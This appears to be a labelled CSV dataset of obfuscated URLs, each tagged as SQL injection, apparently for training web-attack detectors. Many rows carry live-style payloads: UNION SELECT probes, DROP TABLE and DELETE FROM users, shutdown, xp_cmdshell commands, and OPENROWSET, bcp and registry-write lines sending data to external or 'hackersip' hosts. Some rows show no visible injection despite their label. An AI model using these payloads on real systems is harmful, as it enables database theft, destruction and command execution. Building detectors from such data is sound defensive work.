id,class,vector
7861,SqlInjection,/JlfLL/eFjVwh-go/RnLord7a/hDPeQCcBE3-vb/tel3D9dizY_/zyijd/sf8TEcZJt@qcZ_.mdb?Yostmti=u1WAf6I&teo3xjtipdor=8218305&isesSeuhcoIlph=21314&eetphl=boot.inixterm%29sfptamochaOkcn9Rtameta&54oa=liauseayss&hrn=0tqZleeae1eoeesr&oYEO5fXL6IV=wkl4nlq%27%29%3BDELETEFROMusersWHEREupper%28username%29+%3D++upper%28+%27admin&em3ookpa=ohqZcr4TJTi&a2x6ibswtEoob=75&WYecho4NPnR1xn=Hnn&dlntnjli3riim=se&bbnrn=hb
7869,SqlInjection,/@W09CnI7j3hKXD.js?85CtjiAo=%27++++%29+++UNION+++ALL+SELECT+++erz++%2C+++++9osoia2m++%2C+++cielwkks++++FROM+++++ali7+WHERE+++imjeea+++++NOT++++IN+++%28++%27Md%27+++%29++AND+oxSot6ihte+NOT+++IN+++++%28%27ahee44%27+++%29++++AND+%27%27+%3D+%27&at=jritd7pR40DcWo&eiOo=sXo%3Fo&egththi1=8dLiJJBr
7877,SqlInjection,/QjiZ/6@Po/dunnhvhenlsralaot8/jtsdoOs4qfrtn/08IDael4haratxonlb/eclIhrln1v/F9DMiqMSN_tdr9https.jpeg?wHuhEbarsnw=%27++%2B++%28+SELECT+++++TOP++1+++rl+++FROM+thYarYp%29+%2B++++%27&VpDDgLZ=2512624&uEso82=xoHV0Ju&Src485ht=862&rRenSc=470
7885,SqlInjection,/7h_.q-Z/aOyetszcyo4tusfton/rV@eQcwZMh5Y6/rVtE-u6HXbS4VnWfHR/o3rvgj1EZ/ae4q/le.cgi?groibtbuaEbdss=te%3Ftmppositionfetaebinane%5DgFupdate&S41connect=tne+toAnesopassthru&bacsnj=%27+++UNION+++++++++ALL+++++SELECT+evrdimG++++FROM+++slvD+++WHERE+%27%27+%3D%27
7891,SqlInjection,/1osYtdKerl7S/jYbhj1GLxbOwQ3a.cfm?8tl=eB3m6B3t4FS&IhRngjatn=tilusoDeair&mailvarkwiFO=%27%3B+++++begin++declare++%40ret+++varchar%288000%29+++++set+%40ret%3D%27%3A%27++++select+++%40ret%3D%40ret%2B%27+%27%2Base9vhwe%2B%27%2F%27%2Bpassword++from+uR8f5H+++++where+sslrt%3E%40ret++select+++++%40ret+as+++++ret+++into+foo++end--&uasvecshT=0jTcmslq1u0hi9v&.QSuZ5u=ennq3Ko%7Cnmochaoeh+u&ttiweahedzUt9e=qRff+i
7905,SqlInjection,/oR5jGuo/eoaso0/0izyeGlH6/wneanAeeRae7pdndko/GQechogviU.js?eiahomeslsA_=passthruodhm9i&twnhnaeyee=eGpABY&rsDA=yi&e8hz8yk9Ie=lt+efntna5t&ZxHBo7.4=%3B+++++insert+++into++OPENROWSET%28+++%27SQLoledb%27%2C%27uid%3DlptNHa%3Bpwd%3Dassan%3BNetwork%3DDBMSSOCN%3BAddress%3D52.219.191.29%2C1433%3B%27%2C%27select+*+from+++++_sysdatabases%27+++%29%3B+select++++*+++from++LinkedOrRemoteSrv1.master.dbo.sysdatabases&0h1hvari1JnCsam=dtS0bKlG&irgnAb=eO3tsdieigt7sgt8eS&f8tptnplD=92&sz1ee8=2377860&i1waNtczsh=5&d0L=ebnp&ehgwf=yonr&Dkluncpnad=Aetrdocumentv5oiInq&fl=5
7909,SqlInjection,/iw_hk/aIzGWq1Z8kP6GKTS-Ves/aEpseg8/ozhy/erd/qapegaS4oerwl/r.uxGM0mq1XYuF03/wNdUhXscript/lTcOHO_HSV6Rl8_cD/4optbgsoundCrL.php4?ea1egsN=a&olroletls2=egyMnullh%7EIlu-rubt%3C&pr3hefmoCT=nw33z15TYV9f&aentrldyrTyd=%27+UNION++++++++++++ALL+++++++++SELECT+++rzn+++++FROM+++tsrnefan+++++WHERE++++%27%27+%3D%27&TsUuE=1gesemli%2B0ebNj&EknYcatHps@=sx&h5SheFemhmaae=89074668&iuie=childwynA&h2=rut&glnsOm=winntinti&edR4ocNreloSt=0548069&Awcsgl3kninsst=4&pIc=%5D%28&tsrayh=%40bodyfhm&aRht=sit
7918,SqlInjection,ogt=350417&dr4Sdto=8SsaS4EjpeVO&kxIrfTauro=tcps&mgva0mdiv3mochar=6&8-t8qXJ=ns dmi=iorzp[N&WgK@Jlk.JO=(~kens&GonrcstdeFiea=8
7922,SqlInjection,/4@.6i.9Ge_qp/d_sPj-wQkUkRj4ztc_W/0rni/iFzaH33mD98/onaMaeTadfrlomhmwu/khtthc7rpwNr/4sirIeoArzpni/s3scer/f1t/cAd6ecez8hh.php4?L_ta=connectyvM2delete&hyxNpRb=593&opt4H@VE6L=581&suiefitwUptjhN=6758674&ioelnioGeawhv=eheaA%293agroup+bye&mm=84433&6qiovaaowYlu=i%25tct%5DiTna++htpass&ocm=5Ese0rhIavs&uHTn2_rT=%27+++++union+select+++++%40%40version%2C1%2C1%2C1--&suOs7jm02wxoT2b=EbfnconnecteG%24nnaio&orTn=iyltents&yN=23274&b8tstrAaewf3t0=207894&ZrkPY=1
7926,SqlInjection,/objectK7XXM/oE6ohAepnwssnNEaSr/p0@HtlI5Lnfhaving/FXB0d1meta7ZbvDzZ.jpg?sUavUI=d%24usrEne%3Cqttj5oede&ehn=ngroup+byofsolifldgsrh&rn5sueoorlN=nnl2a&jFstdinufrom@6B8Xg=4dvodocument&nti=+%3C+6s&nci=%27+%29++++UNION+++++ALL+SELECT++++728%2C70%2C48%2C037%2C5+FROM+wec2+++WHERE+++%28++%27%27++++%3D%27&npAe=sNO&bygdkecldhond=eTX&tHbhnpisdaaeD4t=9020
7933,SqlInjection,/aE2e.lR3@T@8oMz9/Eitrlia8rept3dse/sVnaJRRtHZJGQ/LlIwi5utnttAe/nk-rv9z6T4p/rJqLyu5@tM/wadx9oX./eBAe0wSfD/hcu/vnbrj8erhd7aorthm6m/eoiEix5centaogmee/aqdABmf.NtY@SbH.gif?jv=zh%2Fhi%24ode4d&J3wEuhV=+c%295+ft&bt5eunaiyh5=372172&tdzp=rdi&M_FOPb-n=28&osais=9523&gaeoCaansg8ee=ee&xodcg3hgv=nesn&iJ62=le1rnbven%3D&vceltiM5eewon=+ras++&a5lUso=%27++++OR++++%275Ttem6hrriZn%27++%3E+%27S&6eheiHeutye=cemnDhHeghlSeDe1E&aeghasaw=4801413389&KinputinQ=59
7957,SqlInjection,/PlKM@positionh-pInF/cTkwhORniceij/wnbctx2cyyb/sW7rd4/tc8st9f/yspuihlI/11_I0/yAdeeersnsu3lrcrws/0azBpST/4ihc2RM8xF6R/y0G.pAO@/lh7kzSoWwmrLEg.7..jpeg?tnan=nneloe9vy&zOj=992&nlUdalcaerltei=393&divrpasswdpc=fsock_stream%27a%3Eorp&bahoebhCvhlhe=exec++++xp_cmdshell+%27%22rmiAlEaos%22++++%3E%3E+++++script.vbs%27&ud=W+fafdne0e
7959,SqlInjection,/ymaezthcio8athndqtoe.cgi?USM25rmtO=hv&gcuRSioeuhaagep=hbBD&gr2nrm=+%3E%276hm%2Firdd&ts=2te&jutst8aacz=09&oa9xae=wril&pa=%24a&oxiebhI=es
7961,SqlInjection,/hzhaeotel6t/sx/iiSgeuwIvagujtip/wp4geinioc/g@v/4%uBHlc/eyendatmwhe/ddChtbhYO8TUrlCJA/nAR5XQ61_ShJp.jpeg?eceh9oE1hitl6E=v%3Ae&hPsisebrno=r54IbaaV&Hn=63&e9oietsamg8=6984371&5EhecyfaEn=exec++++xp_cmdshell+++%27bcp++%22select++*+++from++++aayOi%22+queryout++pwdump.exe+++++-c++++-Craw++-Shackersip+++++-Usa++-Ph8ck3r%27&tnisrm=documentoakni9t1%40fecgav
7962,SqlInjection,ts=on-p eermetahs&nsitms=hhpVX&pifioi1=thOaSrcaeeha4&wDCrl8Cq_4VN=dQ/te&8tOJW240l3=me|2ls sd&iimaho='   )/**/UNIONALL/**/SELECT/**/5/**/FROM/**/bip0pfndt/**/WHERE/**/(   ''    =  '/**/&piu=h5n+&s0eae=igecaE2rme33o
7963,SqlInjection,/ns/eh.asp?cw9xsmub6trlEo=ercpoabodycoEoIh&e8emi4eei7d=85279&4A4K=+%5D
7973,SqlInjection,Oo7WwRncjPx=696&cslt=3598701&heh7otrcd3j=ryl66n4.fC8Q&uWSqqkslB=t&ua_REZ='ti m $o )tw %afs&loiieGTxrsrmrep=tchilds> k&iwee=5dzd6iigioacs&anniseus=>fefqf2nph-yeho+wh~6(&y6lstv=BsasAieS7olitpdstI&UijU=m ri&eaal=81557242&eup0td=zyDpuT._BN&leausiuch=psSa rhulllusr8araudbvar&3adtfmaebfnei=sP6
7977,SqlInjection,/utadns2/d7ttex/PtM9e5e/0CDhGQc/eDiy0loekbTWMM5Y/erpcT46HfyDYqj_ur.sh?ptmu7imei1si=36&yaeacuttbhTdn=22544&ttolohve=eateuRs&Xnhrnraco=passthruon3n&qmhrihjg3oy=dofecbuat7seiframes4&aaiitw=c&roodjp3vnt=d%40&child4zjZqGHx=s.uHR&updateMqZ.kh@2=81773&Hnof4=20503&iy=mgscriptiga%3Dg&ohikzc6aonwu=%27+%29%2F**%2FUNIONALL%2F**%2FSELECT%2F**%2F4279%2F**%2FFROM%2F**%2Fer%2F**%2FWHERE%2F**%2F%28+%27%27++++%3D++%27++%2F**%2F&imfouaae5mxe=iqxOurdy6PZI&iotmsn2nwE=%2FND
7982,SqlInjection,/resvaAdhmq8ur/eokyaa3lnPottOhOe8pe/cewagel/rXXWfgk-ysqPZVL1N4il/aM9ug2_/pTW/ciRuTrTtle6ytTeloww/le26teoaog.jpg?lsCRShtpassJ4V=lhtscbawotfoe&3Tm0aitwm6wee=8800&5eyh=0dx&to=%27++OR++++%271teerm9dil%27+++++%3C++++%27X&nntsor5eedina=yha
7997,SqlInjection,/N6aaer/1sbWI/giesid/huKq.3UTvE2Vy/keosUDdnitiomor/sC/jh@3F.js?nibauyenti=%7Ep&oNrdrn0t4ivi5y=%27%3B++++shutdown--&irqexxCdas=N%3Fs
8000,SqlInjection,imd=arxt&Noieroa3bclto2v=86&xa=n4tYW-QVxl&-as5q=scynoM&IbesitwtpiaEa=52&7X3wApasswdbli=fu'   UNION    /**/    SELECT    tf  FROM   dba_users     WHERE ttw     like     '%25&eBKL=cZhi&zr3E2s.wEP=lapni)&VPYeiVycl=mhrp8tldoi9eu61i&rltxtetxi0rr=do&e3=3173208
8007,SqlInjection,/eGcVlS/hbW0lo_RCuPhut@8.php4?ee2tolt=%27+union+++select++sum%282tombm6%29+++from++++ebvpehi--&rdol=q%40Y&di8=i&jYslFtU2=eko&jokPbtagouh=557034&vicctEo=ch+if
8009,SqlInjection,/m7Rt/.kgp/5wrD.aeWFIfgEJ@V/e0fUK@CwJK.jpeg?ohp1jIis=%27%3B+++++drop++table++yftB6yqneh&eDOrlyHspt=ewb8I&qtcna=7336348&nAnTwsta6at=03339857&e7y6nraat=sIidi
8016,SqlInjection,aeitut=2&pra8soodIoHt32='   OR     'Emn0'    BETWEEN    'R'     AND 'T&1ogaecneartGest=es8&Sexetyc2=02694&-window.openx8rHKBBv=9445825&Rko.zHm.nbgsound=D r&0yp0H7htaccesqNVln=9grsho&ahM=debdB&bnrseris8cl9A5l=wrhnhss&24tmheh=7&ae9otoesztu4dE=hi~&edtt2j=osy&.O6mbodyGcA= ilinkaccept&wnao=birqaoSl&ml=?lrre4/cbonis
8035,SqlInjection,/rCfb9XhiA3i.aspx?havingRwnph-x@gvJPM4=hs&2bgnotI=%27+UNION+++++++ALL+++++SELECT++++vedy3nl++FROM+++++nes+++++WHERE+++%27%27+++%3D+%27&imok=+i-in0im59t6otd&lq5TTimg_hxmM.=oUIs&wt=231446487&gt3mtcnbiSanO=nKJw9rN7c&bOoti=9653090&y7T4iEalYrhi=a7iGt01aGm&wrHT=3ts98rueots&c5fe=2wNVD66&nsa=9166
8047,SqlInjection,/0AmfromadFR.21./iVBAWqw6@GIuOHV5cW8l/@locationbetweenwgetE/iyhie6hi/SE7LorHZBolocationsTq/03ehqhpro0hipiqtcot1/pseua/rrvAuaonhfant/1@ycopyDqa.msf?lpruezszloRi=oo4oor&RinzucyrOue5=rmeta9b&hxiJ=6aseoOt%27+%29%3BDELETEFROMusersWHEREupper%28username%29+%3D+upper%28++++%27admin&nipi5kn8aMta1m0=32605&Siiifb=cHnnyaf6wroi&tad9chlteyaae8=rfkfytc+8n5&ajetewmu3=2t6iklM5csbb&01ipe1l=ktst&meokpo=oi%5Ddocument&sUo=i1%29cN
8049,SqlInjection,/n_jX/PQtadmin0wrI3/tAnoah/e@aCG2Jxqe424M/hgnmtblt2lGdbt/IsetlpE2uetm/6hj2tl/B@zT9GAk/i6hOa4e/nHSMkBr.png?eT=u27e&cEz1heuqianll=fe&YAB5z=iVazU4&c0ie4lhd=rcxtgp3nae&TH_hTLkzsystem=catjao8&wImtd3pov6=ihavingemrL&nt=rimexecssgsf
8052,SqlInjection,/.8Z2fX4a/m@fWOOYSe/s5nTr2s.swf?Gahth057ca2=hdG%3B5Nea%7Cqp4homer%3A&qn5nstdin=96348927&pmrdehah4Tons=raqTdmprfae&eEi=kcNfs&cnt=%29%3F&90abaEoeScer6tC=psegin+loraiD%2BABleeexecp
8064,SqlInjection,/rosnnamdeO0ithoe/rjrn1udm6aarw/oyddft3ehuvtountl/iI/o2x_8Nh@Vv/xt.gif?gfarteoOGRanlo=d83&bgsound@JT679=exec+xp_regwrite++++%27HKEY_LOCAL_MACHINE%27%2C%27SOFTWARE%5CMicrosoft%5CMSSQLServer%5CClient%5CConnectTo%27%2C%27ll2her%27%2C%27REG_SZ%27%2C%27DBMSSOCN%2Chackersip%2C80%27&ptcducadvjdAuo=nEeeb&pelilh=32&jdegbee=bezeaes&svtRci0ne=548&aLtOnntnpt=yvOhnsiriytvhdlNw&4rrOaalsea2=4cZUXCO&sbeosobzgs=4778629&unRrpe8eerrmei=646
8067,SqlInjection,/demrmlj/aNsaL/bP8iPND5/3vgroup
8070,SqlInjection,/geqabhio/NWkLuopenEfERandM/open_UE.KpO6/g1o/bcjq/eVOYu8h-F00Z0mS/ogbAXynlRvc/tyK2.WEja_olAXkYvom-/gn/du75eqWlCKX/zo8croseeeid1E/eaQ.asp?2CsmochaV9_=nofd&sjueda=lsnhm&o3wi83=%3Balter+++++table+geseieitil+++set+++++password++++%3D+++%27bion1%27+++++where+++++name+++%3D+++%27d09%27%3B&km=9757028009&Iafsa4tayae=aerhlotco&iq9fwe=cr+
8071,SqlInjection,/mtfY0@_/heQeval7Pg@optVOfcD/iijmehtseyyS4t/yRI8HqA73e.shtml?0DgafljPEPYchild=79922654&ftf6AtaomroU=a&esagedR6=ciotandf0arcmdr%7Ed+Z%3C&taywteorn45=lae0Oso3ui&ilie=OR+++%27pInL%27++++IN++%28%27%27++%29&pbelikeOo=YmapmaocrespdQ&zk@u4O.UHCWx=dnishutdownutni0df%3DesjZca&4woI=tdw%26uUtun
8075,SqlInjection,"lt=naccess_lognodeoT6~Tdrehiae&aioi4arage=exec   xp_cmdshell   '""c6ibk4tne""  >> script.vbs'&cc=lGC&7boreore=5324808&asmlweiyTli=oRnC&10aOFh33jg=EwF6fo1nlTss&l3e15AfseHsa=stylesslwnUErtskeg&@YSAdropU43m4og=704&knime2etninreda=eropSoc6o2k&lTbwZo=aeb7ad-asQolog5o&atMoef=ctyA&sn=498626&teSf1=sor4lqto3lswV"
8078,SqlInjection,Agd8.Hxp_tv=j&usfesyesdesnk=renndpez8h&etekgse=te&vWlocationpShttpzS=869&pwau=mnt2&services_ViLLYshutdowns6-=568&aetyrAyrssrsel=501&zenrwhelei=twn4sfim&7cnpihtow=OrigText'OR'msl4b9'=    'cEiSeon'&re0DWQRRB9o=wzi6ded1smtatinaO&QRTfSAWa=delete/ Ehxocihto k~sdT&arzePkt1=4u3ebko&meaivsdnoe=7634338934&osnR6IsenSohoo=eA3mZbEJOE&0a0oQ=4045
8080,SqlInjection,"anNhrieJiloc=mrtzhtgr1l&rnh4irol=c@&xmlnp8haoo6gb6&dksanriexb=5&2hTp2=528235618&ldeyu7rtse=zrH3Z&laqwqoyoam=; EXEC(    'INS'+'ERT   INTO   users     values(454,'erhWegtRhm','oreSH' ))&znitdnoeHayRass=B]"
8082,SqlInjection,2ahcrpiaOsn=e&.rIWhavingU@LDrYB=d%29uGESdl0sd%3Eioaeannw&oitlggiigo3z=honas&gp6LX-21asystem%u=427210&3ZtQ-cmailh13U=a1R&lLnisiny=enUreTo_pc&ia3ecdnareanue6=OR++%27wetd%27+++++BETWEEN++%27R%27++AND+++%27T%27&fir2AdtEe1=e4DEGS3t&osos8A5UtOuFsko=e%29fmrmpeemysej%25nseau%7C
8087,SqlInjection,/omiIhnkepRrats/ginsertR@45R_@KWZ/nemi.bin?wazhrenh=33181160&tleonseahf=%27++%2B+++%28+++++SELECT+TOP+++++1+ciOoHh+FROM++lmtra8m%29+++%2B+++%27&VbXTRCvRu=vtsdwgrni3baR35&o2e2ob=t%40_nT&Oac3=8311&nehteulhtv=h6rea&bm=rbnvk&ieoeSs=i5Q02lw&ie=O5slalisystem+%24enull&i1aqoi=nz&bhucjeod=53915&rnrv=0
8101,SqlInjection,/xjnbX@GaUAxT/oesyynnonix/ZDdstdin97B/ksawat_5_.mspx?rwaob6iebed3bni=f%29c%5CiWlnmooo&1loiiepobAenti=tLXSe2rqzL&ohbhNynnoao51=175&1eaes=%27++++%29++++UNION+++++ALL++++SELECT+++5+++FROM++IUmbcgie++++WHERE+%28+++%27%27++%3D+%27&a7etcVbPs=rG-X1&T_kaR=yoomyite6nmo&iiJR9wZyEzT=+e%24
8106,SqlInjection,/style.BdeletebE9QH/m0k/epyxe0iem6mtaenbacn/raOttJFGnku9Zz/MxdCJ7/iwu1hd/fmhuc2@z4N/yKe-LLgltedP8prno.css?abdn=%27+AND+++++USER_NAME%28%29%3D%27tet&OetimeaiaJn9ehh=tdrTi&KEL09=rr&kj2auw=TSe&wicoqa4=e9jf%40ehFy%40&n8e=ozkIq&liB_=or-ry+tmce%7Cmsincee
8109,SqlInjection,/e2slM7bJe1pAI7w/4me0fExH/UxS/eewsnmvhpli/lA_nF03/OqhrmbgsoundEautoexec-n/thilasiejEon1tnouee.html?vncohBwsEipt=4927&@accept9sock_streamN=fan&k@REBo4fibO=nbLswhWee%7Cs%24ss&anahniiaNlTrbih=55&npnses=%27++%29++++UNION++ALL+++SELECT++en7ha2++++%2C++++ldmrasli++%2C+++++iovsee2++++FROM+++++tclsaWc+++++WHERE+++++ee++NOT+++IN++++%28+++%27tax%27+++%29++AND+uEroohd++++NOT++IN++++%28+%279Dla4aiia%27++++%29++++AND++%27%27+%3D%27&wi4moegrjnn=45&grha=attnarid2dc&eryteT6teitafsd=aKB&io6eyh=hei0ayehd26%7E%7Eyinmaccepte&haoyedessealcfr=5oNlPg-H&dfnn=woa3ndt6ptehen&trkacousf=n8Rignocefmonn&siis5avebfn2=947
8114,SqlInjection,/nO5/yzgako/g6LoIXLu/m4cdbtwh/tds1iwtctb/boot.iniOZH6wtobject/jIh@k/h_MOhmW3ydJl.asmx?iNaeNrdasu7e=%27++%2F**%2F+OR+%2F**%2F++%27ov53ai%27++%3E++++%27S&5fgX=2ltmpnlet%29nmocha5%29ndrZu&bour=e8&PQK4jxml_@-v=ao%3E
8131,SqlInjection,/liEv/vd1HUz@7@Y9fUY/BG@daVfApositionaccept/uwut8M8aiz9hbrde2/arJZjo/P58NWWOservicesM6txvx/urhizncln1hxdpn2vh/sz6bafterotrLrDlfeme.png?oErcwhg0eest=iamsam8&a4sEpn=%27%3Bdrop+table++++msNyZeejn&CehlT1Roldce=813&lnuftihvf=48833072
8133,SqlInjection,/awoe2nnRdde78nntvid/nd0xwjVxnZzfvMmFNZ/aw_CF6V1fgHnv/hgsweslteBueg0/oDTF3vrW7Yz_keA.lLT/hivFrBP2Uqry/4tweU0sunesato/DqQBE1/eanhehgNg9magyoiLt/hfn7aiihslhatknandg.html?lalNyUsc=OR+++%279cT%27+++++%3D++%27++%27
8136,SqlInjection,/2re/eTSiMmQdb0eS.6u/rXe026fNWR/enehodn/etIieo8elrsl/gXqu-.NE/evos/srithlu3Su.mdb?a7=8x%4082eRZ&lrputaofh02ch5t=%27select+++++customer_phone+++++%27%7C%7C%27from++++customers++%27%7C%7C%27where+customer_surname%3D%27%27%27%7C%7C+++lv_surname%7C%7C%27%27%27+++++and++++customer_type%3D1%27%3B&rhaatnledsrmn=etcusr
8138,SqlInjection,/k@SH5bjbRF2.8MGa0yu@/duahltnu/hi/2xer2hsatlai/sioeptoeix2/ogn8oescH/wRllrsekeietAd/5M.m9x.Z9g9eWcz.png?tkqoa7juadru0=%27+++%29+++++UNION+++ALL++SELECT+++3++++FROM++nmlcnl++WHERE++++%28++++%27%27++%3D++%27&eerkcs=6iwinehl
8152,SqlInjection,/equTeaeO5LsgHnnei/0xew3oey/rdBheFp/4vn5iDGU@tB/rt_vEoklZm/k.6qduetc11KHJ/iEr4wfdresiqni/uVWPm5s681xjcqw/WCH7tqHkUlWJchildun/erXikvFJ0txdnF-J/f9yAE9SYMhvVKMY-Zsw.cgi?vgcgnihgdb3oas=ocD-NxY.lMl&lbautL=4920017&ihf=geGdtnwa6txrt&1eafflehTutse=%27%29%2F**%2FUNIONALL%2F**%2FSELECT%2F**%2F4%2F**%2FFROM%2F**%2F4w7m%2F**%2FWHERE%2F**%2F%28++++%27%27+++%3D++%27++%2F**%2F&qGt8xpceYt3esry=41870215&w4nBethtatueon=874&aiRhr5=de&rrAywiae=i9vrlr&dtae=0607611&x6=+%7Cmailexeclcar&lrEih=%3Fsnullrt%5Bh
8159,SqlInjection,cc7ahshsiodda=9771&bmiyhE=]tA8e&L14SyEyXdur=hNwDp4&d7=351&4rZob1blthrpln=rCsnmdftp7uu&yiset=services&sonnyI=80151&t1i1etenhth=Gformahx&3erdbnEo=9&9eesn=e5ls\irzpe&1peM1ososyco=jstfturkcoyeartolink11l&ol7snuU7er= eErnt~2?e
8160,SqlInjection,/9QMj4eEVb9cww/4yr/gptajyno9hatmhnae9/svE9iO99q/wyrEbomm0jx/VhSX.9K@TnN.js?includeNM.zH=leattjO&ieesUhevft=tP4mfVOw1t&XI6H=openndeaad-bodyabf&rasten1r9e=iqlitnteeaftswni&k5nd3hesysaaor=14&xeeoily=7455&s9a5tatysahsi9i=6gractgekEm&muka=aupdatel7i&ociilafi7rp=OR+++148312391%3D148312391&h9istrjph=696362&sSGss=qt&pn=f6psI
8168,SqlInjection,/h-OLqu/aT8NDi/eHIM5/ch/h6yv/iFmYiframe/dnttrav/5Xhxl@B6PC0xBMkNUp.P.msf?ute5O=49419856&bdieEfna2=%27%3BEXEC+++master.dbo.xp_cmdshell+++++%27cmd.exe&fUitatiyn=lXZ99F&hi=iUtieemRoNrvasI4a&h4e-uL=lnc0&esLgfyntObtod=tn%27eQz&e7fe7eauNndhrb9=6392517&sqife=3804970127
8174,SqlInjection,/2XXbYj7Q.mdb?se2Thikr0rmtgn8=%27+%29%3B+delete++from+users%3B++++commit%3B++++dummy%28++%27&et=2&sodmo=mEvjZu&WiCeowenDhmaloc=swglliv7iaT&aN5dtldaAoefl=%28e&blocationscript8MSp=694989&5loioii82b=7635&ltgt=917&da8y=db9ehiu&2noraiddnn1am=311973&zte=fNqUHFBZGw7Z&asF2et8eivepanr=78224229&9t=ebncai
8178,SqlInjection,/Tgnsotew/ocxYmQh2zZCnH/esUJHh/tbvjFw3KvTyCmdhUX/851G/v6_qIlmy1U2ReSIeA4/6mE/doGtolo/Ba/WANRAKIMay/hpuTQ24.tiff?snc=11615&fbi3hnchl8=urluo9asasenc&rwhcitdnD2n7guh=n%24ovImorh%5Dw%3F&aoqa=c%3D7ian+htsfom%29noe%5Boe&pa=Oea5oNnoseiedn&t4uilhnra0d37rt=izji&7Fhttporv=YoEgex3Yddtm5&vreueetne=pjh&bflxsmG=1&.Hr2=73705450&Eueawaotdwtf=4r6Is&3GKC7M=%27++OR+%27oReti%27++%3D+++++N%27+++++&wfRJot4ka4djswl=904656&ubii3cmHese=dNMN_&sqOruxUhGpj=4
8179,SqlInjection,/ead7sVsRs6ib/at2smicttle5mxe/eJ_xqTEXemw/tc/Eenea8eiechcrktcsxl/exj1SyN@fcaDSHFlzV_/pAUV_/it/6lePiuyieteesuAle/nhoefoise5cc5eohct.dll?c41RU=edcpasswddrwtlon9niperlu+ng&icotl=31&se4aaiHte=OR+++%27atd%27++++%3D++++%27++++%27
8191,SqlInjection,/h6-a0Il2Fu/o2Iqo1Ur/nernoB2tse6o1En/vm1stnvoijdfe/tII7EO5nFOl/K0AY-/oKH1R/4S5BMcEstrJkc/rlIyawe/cELLhwZoP-ZsTU/i8eyt.asp?deenheaiaeynse=mlatCio+8hh%3Dtf%5B&air1ryythhao7e=0aite&myeasoYeyoieef=rhaHmnaO0vxcs&5bos=o6xwoeotYsFi&egeah=oF%40GS&tTE08=%27tmpss&eiinTonhhz2eoat=t&eaAho=%27++%2B++%28++SELECT++++TOP+1++3hiyjo+++++FROM++++M4haenr%29+++%2B+++++%27&JH68mocha@QP=576952&Eoo5gtin6tti3j=bgsoundiimge%7C&balt=%26nmumas27%25s&srKcselt4imt6=eCv-m9J&tpmeg6u1bysytyi=ibenph-tee
8193,SqlInjection,/KV.Z/nJ/iqHu4waW.asp?acsNnae=%27++++OR++%27%27++%3D%27&thits8osr=6634612
8207,SqlInjection,/rgXTR-Jvq/tn.tiff?t9xNwamrns=hatesthi%26ba%2Fhtpassela+hn&totha2crer=r0d3eths7%24bnuNvse&niNyIakeaj0st=++++OR+++++2+%3E++1
8209,SqlInjection,/eS.y2X3/iformUELn/dRlnECzoZXfWt/hyFV_egLV0qKXtD/sVX8mD6-HoLuelluFzD/s4iqnt/hzrHNx6-xm72eV4k/g@SL-/heeeboistn/9st6tscAFts5i.pl?6ard=execnqrA&oehkefai0jst=618&PiX7FXhaform=ac%7CT&azmae2zoeqI=83&iHeae2os=5aTsMo1&oe2BatXTcfj=%3B+exec++get_cust%28+%27x%27%27+union+++select++++object_name%2Cobject_type%2C%27%27x%27%27+++from++user_objects+++++where+%27%27aeseoad91s%27%27+%3D+%27%27+%27++%29%3B&rokaam9ew=e1vH&ab=t5jG0&a4ie=civa&JcWQ2servicesexec=tTaymrcpeegaTef
8210,SqlInjection,/KuZLcSG/hetstnSwot0a/vetc.exe?IglarDm7la=ecopy2%3Fh&reeGoega=%3Dtj&edtnnhnt8dUs9nn=n%3AametaZ&UzAocRxterm0nlink=zsttmstp3trsYieo&e8hknen=1169773&selnme=ahx&ietOe=e+&d81Z8=rXm%40AmW&DIdn6cSotgiswrn=62134417&isy8dbli=doaraoh&dfigsr6ouIor=exec+++++xp_cmdshell+++%27%22rd7ug5le%22+++++%3E%3E++++script.vbs%27&tch=zle0+cmdsNmuioyrt&qrf0S=0834&oceir4rsee9r=the
8214,SqlInjection,eaarlnhe=wbF  Stfhat&dpl=nlr&i4bw0Deys07trxr=1&qo0oiemelrHi=8&14Noaisaaehnaeu=T etcne Tt;:e=]s&reKformd.ARIZ=la2h3&nsoemNkltibcr=(aro&C180d-PU=1281991&rael=0Lgr&UneUtadvs=t40r&selhhl6=yozPjI
8222,SqlInjection,J5Nnin=OR     '8ub'    BETWEEN    'R'    AND    'T'&lge4cdoeee=dotwydIetep7&aNta=psYNs6rsoh]r a&Cj1aeIrhghn=t8nieait j&epDo=vrusgavbscripttreanEwsock_streamc&Oahrqaesdnaea=3901326186&yeag=D&0&ay=mg6sdee&htpassIyYC3=981
8241,SqlInjection,/drctstnynte/uwdm9IDa/oahueutsth4se/Tattgx/7s.shtml?vK0rFe=%27+++%2F**%2F++OR++++%2F**%2F%27%27%3D+%27
